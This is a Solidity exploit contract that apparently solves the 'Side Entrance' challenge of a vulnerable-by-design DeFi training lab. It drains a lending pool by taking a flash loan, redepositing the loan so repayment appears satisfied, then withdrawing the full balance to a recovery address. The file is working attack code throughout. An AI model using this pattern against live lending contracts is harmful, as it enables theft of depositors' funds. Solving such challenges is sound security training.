// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IFlashLoanEtherReceiver, SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";

contract HackSideEntrance is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;
    address recoveryAddress;

    constructor(address _pool, address _recoveryAddress) {
        pool = SideEntranceLenderPool(_pool);
        recoveryAddress = _recoveryAddress;
    }

    function attack() external {
        uint256 amount = address(pool).balance;
        pool.flashLoan(amount);
        pool.withdraw();
    }

    receive() external payable {
        (bool success, ) = recoveryAddress.call{value: msg.value}("");
        require(success, "failed to send ether");
    }

    function execute() external payable {
        // deposit into the pool
        pool.deposit{value: msg.value}();
    }
}
